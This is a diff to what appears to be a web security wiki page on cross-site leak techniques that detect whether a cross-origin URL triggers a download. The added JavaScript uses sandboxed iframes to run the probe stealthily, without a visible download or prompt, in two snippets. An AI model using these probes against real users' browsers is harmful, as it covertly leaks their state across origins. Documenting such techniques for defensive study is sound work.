@@ -46,6 +46,8 @@ The following snippet can be used to detect whether such a navigation has occurr
 var url = 'https://example.org/';
 // Create an outer iframe to measure onload event
 var iframe = document.createElement('iframe');
+// Don't actually download the file to be stealthy
+iframe.sandbox = 'allow-scripts allow-same-origin allow-popups';
 document.body.appendChild(iframe);
 // Create an inner iframe to test for the download attempt
 iframe.srcdoc = `<iframe src="${url}" ></iframe>`;
@@ -71,13 +73,19 @@ This attack works regardless of any [Framing Protections]({{< ref "xfo" >}}), be
 
 ### Download Navigation (without iframes)
 
-A variation of the technique presented in the previous section can also be effectively tested using `window` objects:
+A variation of the technique presented in the previous section can also be effectively tested using `window` objects, this also uses a sandboxed iframe to prevent a visible file download or prompt:
 
 ```javascript
 // Set the destination URL
 var url = 'https://example.org';
+
+// Don't actually download the file to be stealthy
+var iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts allow-same-origin allow-popups';
+document.body.appendChild(iframe);
+
 // Get a window reference
-var win = window.open(url);
+var win = iframe.contentWindow.open(url);
 
 // Wait for the window to load.
 setTimeout(() => {
